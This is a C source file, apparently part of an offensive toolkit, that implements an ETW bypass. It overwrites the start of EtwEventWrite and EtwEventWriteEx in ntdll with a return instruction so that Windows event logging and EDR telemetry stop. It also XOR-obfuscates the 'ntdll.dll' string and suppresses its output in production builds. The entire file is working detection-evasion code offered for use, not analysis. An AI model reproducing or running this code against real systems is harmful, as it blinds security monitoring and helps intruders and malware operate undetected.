/*
 * Author: 28Zaakypro@proton.me
 * ETW Bypass - Patches EtwEventWrite to prevent event logging
 * EDRs use ETW for telemetry, patching it with 'ret' blocks monitoring
 */

#include "etw_bypass.h"
#include "obfuscation.h"
#include "syscalls.h"

// Patches ETW function by writing 0xC3 (ret) at start
BOOL PatchETWFunction(const char* functionName) {
    #ifndef PRODUCTION
    printf("[*] Patching %s...\n", functionName);
    #endif
    
    // Obfuscated "ntdll.dll" (XOR 0x42)
    BYTE obfNtdllName[] = {0x2C, 0x36, 0x26, 0x2E, 0x2E, 0x6C, 0x26, 0x2E, 0x2E};
    char ntdll[16];
    DeobfuscateString(obfNtdllName, 9, 0x42, ntdll);
    
    HMODULE hNtdll = GetModuleHandleA(ntdll);
    if (!hNtdll) {
        #ifndef PRODUCTION
        printf("    [!] Can't get ntdll\n");
        #endif
        return FALSE;
    }
    
    PVOID pFunction = GetProcAddress(hNtdll, functionName);
    if (!pFunction) {
        #ifndef PRODUCTION
        printf("    [!] %s not found\n", functionName);
        #endif
        return FALSE;
    }
    
    #ifndef PRODUCTION
    printf("    Address: 0x%p\n", pFunction);
    #endif
    
    // Change protections
    DWORD oldProtect;
    if (!VirtualProtect(pFunction, 1, PAGE_EXECUTE_READWRITE, &oldProtect)) {
        #ifndef PRODUCTION
        printf("    [!] VirtualProtect failed: %d\n", GetLastError());
        #endif
        return FALSE;
    }
    
    // Write patch: ret (0xC3)
    *(BYTE*)pFunction = 0xC3;
    
    #ifndef PRODUCTION
    printf("    [✓] Function patched\n");
    #endif
    
    // Restore protections
    DWORD temp;
    VirtualProtect(pFunction, 1, oldProtect, &temp);
    
    FlushInstructionCache(GetCurrentProcess(), pFunction, 1);
    
    return TRUE;
}

// Disables ETW by patching EtwEventWrite and EtwEventWriteEx
BOOL DisableETW(ETW_RESULT* result) {
    #ifndef PRODUCTION
    printf("\n");
    #endif
    #ifndef PRODUCTION
    printf("╔══════════════════════════════════════════════════════╗\n");
    #endif
    #ifndef PRODUCTION
    printf("║       ETW BYPASS                                      ║\n");
    #endif
    #ifndef PRODUCTION
    printf("╚══════════════════════════════════════════════════════╝\n\n");
    #endif
    
    result->success = FALSE;
    result->etwEventWritePatched = FALSE;
    result->etwEventWriteExPatched = FALSE;
    
    result->etwEventWritePatched = PatchETWFunction("EtwEventWrite");
    
    #ifndef PRODUCTION
    printf("\n");
    #endif
    
    result->etwEventWriteExPatched = PatchETWFunction("EtwEventWriteEx");
    
    result->success = result->etwEventWritePatched;
    
    return result->success;
}

void PrintETWResult(ETW_RESULT* result) {
    #ifndef PRODUCTION
    printf("\n");
    #endif
    #ifndef PRODUCTION
    printf("╔══════════════════════════════════════════════════════╗\n");
    #endif
    #ifndef PRODUCTION
    printf("║       ETW BYPASS RESULT                               ║\n");
    #endif
    #ifndef PRODUCTION
    printf("╚══════════════════════════════════════════════════════╝\n\n");
    #endif
    
    if (result->success) {
        #ifndef PRODUCTION
        printf("  SUCCESS: ETW disabled\n");
        #endif
        #ifndef PRODUCTION
        printf("  • EtwEventWrite patched   : %s\n", 
               result->etwEventWritePatched ? "YES" : "NO");
        #endif
        #ifndef PRODUCTION
        printf("  • EtwEventWriteEx patched : %s\n",
               result->etwEventWriteExPatched ? "YES" : "NO");
        #endif
        #ifndef PRODUCTION
        printf("\n");
        #endif
        #ifndef PRODUCTION
        printf("  [INFO] Events no longer logged, EDR telemetry blocked.\n");
        #endif
    } else {
        #ifndef PRODUCTION
        printf("  FAILED: ETW bypass failed\n");
        #endif
    }
    
    #ifndef PRODUCTION
    printf("\n");
    #endif
}
